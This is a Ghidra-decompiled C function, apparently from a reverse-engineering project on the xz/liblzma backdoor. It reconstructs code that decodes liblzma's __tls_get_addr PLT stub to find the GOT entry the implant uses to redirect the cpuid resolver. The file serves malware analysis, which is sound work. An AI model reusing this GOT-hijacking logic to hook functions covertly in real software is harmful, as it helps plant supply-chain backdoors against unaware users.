// /home/kali/xzre-ghidra/xzregh/103FA0_update_got_address.c
// Function: update_got_address @ 0x103FA0
// Calling convention: __stdcall
// Prototype: void * __stdcall update_got_address(elf_entry_ctx_t * entry_ctx)


/*
 * AutoDoc: Disassembles liblzma's `__tls_get_addr` PLT stub, accounts for the short/long JMP encodings, and then computes the true GOT
 * entry by applying the stub's 32-bit displacement. The resulting pointer is cached in `ctx->got_ctx.tls_got_entry` and later used
 * as the anchor when swapping the cpuid GOT slot over to the implant's resolver.
 */

#include "xzre_types.h"

void * update_got_address(elf_entry_ctx_t *entry_ctx)

{
  void *plt_entry;
  ulong jump_flags;
  long reloc_offset;
  void *got_entry;
  
  get_tls_get_addr_random_symbol_got_offset(entry_ctx);
  plt_entry = (void *)((long)&_Lx86_coder_destroy +
                   (_Llzma_block_uncomp_encode_0 - (entry_ctx->got_ctx).got_base_offset));
  (entry_ctx->got_ctx).cpuid_got_slot = (void *)0x0;
  (entry_ctx->got_ctx).cpuid_slot_index = 0;
  jump_flags = (ulong)(*(char *)((long)plt_entry + 1) == '\x0f');
  reloc_offset = jump_flags * 4;
  if (*(char *)((long)plt_entry + jump_flags * 4) == -0xe) {
    reloc_offset = reloc_offset + 1;
  }
  got_entry = (void *)0x0;
  if ((void *)(ulong)(*(ushort *)((long)plt_entry + reloc_offset) + 1 & 0xffff) ==
      (entry_ctx->got_ctx).tls_got_entry) {
    got_entry = (void *)((long)plt_entry + reloc_offset + -0x12 + (ulong)*(uint *)((long)plt_entry + reloc_offset + 2));
  }
  (entry_ctx->got_ctx).tls_got_entry = got_entry;
  return plt_entry;
}

